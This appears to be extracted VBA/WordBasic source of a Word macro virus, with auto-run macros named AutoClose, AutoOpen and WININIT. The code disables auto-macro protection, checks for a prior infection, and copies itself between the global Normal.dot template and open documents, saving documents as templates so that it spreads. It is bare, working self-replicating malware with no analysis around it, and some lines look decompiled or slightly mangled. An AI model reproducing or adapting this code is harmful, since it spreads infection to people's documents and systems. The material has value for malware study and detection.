   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "F%"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim J$
   On Error GoTo -1: On Error GoTo Finish
   WordBasic.DisableAutoMacros 0
   J$ = LCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
   If J$ = "normal.dot" Then
       If VI = 1 Then
           GoTo Finish
       Else
           InfectDOC
       End If
   Else
       If VI2 = 1 Then
           GoTo Finish
       Else
           InfectGlobal
       End If
   End If
   Finish:
   fWordBasic.Call "WIN"
   End Sub

   Private Function VI()
   Dim i
   VI = 0
   If WordBasic.CountMacros(1) > 0 Then
       For i = 1 To WordBasic.CountMacros(1)
                   If WordBasic.[MacroName$](i, 1) = "WININIT" Then
                                VI = 1
           End If
       Next i
   End If
   End Function

   Private Function VI2()
   Dim i
   VI2 = 0
   If WordBasic.CountMacros(0) > 0 Then
       For i = 1 To WordBasic.CountMacros(0)
                   If WordBasic.[MacroName$](i, 0) = "WININIT" Then
                                VI2 = 1
           End If
       Next i
   End If
   End Function

   Private Sub InfectDOC()
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.MacroCopy "Global:WININIT", WordBasic.[FileName$]() + ":WININIT"
   WordBasic.FileSaveAll 1, 1
   End Sub

   Private Sub InfectGlobal()
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoClose"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":WININIT", "Global:WININIT"
   WordBasic.FileSaveAll 1, 0
   End Sub

   Attribute VB_Name = "WININIT"
